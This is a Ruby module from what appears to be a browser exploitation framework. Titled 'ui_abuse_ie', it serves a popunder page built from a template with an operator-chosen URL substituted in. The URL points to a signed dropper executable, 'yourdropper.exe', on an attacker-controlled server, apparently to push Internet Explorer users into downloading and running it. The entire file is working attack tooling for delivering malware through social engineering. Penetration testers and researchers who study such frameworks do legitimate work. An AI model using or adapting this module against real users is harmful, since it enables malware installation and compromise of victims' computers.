#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
################################################################################
# Based on the PoC by Rosario Valotta
# Ported to Server by antisnatchor
# For more information see: https://sites.google.com/site/tentacoloviola/
################################################################################
class Ui_abuse_ie < Server::Core::Command
  def self.options
    [
      { 'name' => 'exe_url', 'ui_label' => 'Executable URL (MUST be signed)', 'value' => 'http://server_server:server_port/yourdropper.exe' }
    ]
  end

  def pre_send
    @datastore.each do |input|
      @exe_url = input['value'] if input['name'] == 'exe_url'
    end

    popunder = File.read("#{$root_dir}/modules/social_engineering/ui_abuse_ie/popunder.html")
    body = popunder.gsub('__URL_PLACEHOLDER__', @exe_url)
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200', { 'Content-Type' => 'text/html' }, body, '/underpop.html', -1)
  rescue StandardError => e
    print_error "Something went wrong executing Ui_abuse_ie::pre_send, exception: #{e.message}"
  end

  def post_execute
    content = {}
    content['results'] = @datastore['results']
    save content
  end
end
